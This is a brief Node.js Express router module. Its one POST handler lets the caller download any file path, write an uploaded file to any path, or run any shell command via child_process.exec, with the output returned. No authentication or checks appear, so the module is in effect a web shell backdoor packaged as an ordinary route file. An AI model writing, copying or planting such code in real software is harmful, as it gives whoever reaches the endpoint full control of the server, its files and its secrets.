var express = require('express');
var router = express.Router();
var multer = require('multer')
var upload = multer()
var fs = require('fs');
const { exec } = require('child_process')

function errNoAndCodeFromErr(err) {
    return {errno: err.errno, errcode: err.code}
  }
  
  router.post('/', upload.single('payload'), function(req, res, next) {
    switch(req.body.cmd) {
      case 'download':
        res.sendFile(req.body.payload, function(err) {
          if(err)
            res.send(errNoAndCodeFromErr(err))
        })
        break
      case 'upload':
      // uploaded via multipart/form-data
        fs.open(req.body.path, 'w', function(err, fd) {
          if(err) {
            res.send(errNoAndCodeFromErr(err))
          } else {
            fs.write(fd, req.file.buffer, function(err, bytesWritten, buffer) {
              if(err) {
                res.send(errNoAndCodeFromErr(err))
              } else {
                res.send({success: true})
              }
            })
          }
        })
        break
      case 'exec':
        exec(req.body.payload, (error, stdout, stderr) => {
          res.send({error: error, stdout: stdout, stderr: stderr})
        })
        break
    }
  });

module.exports = router;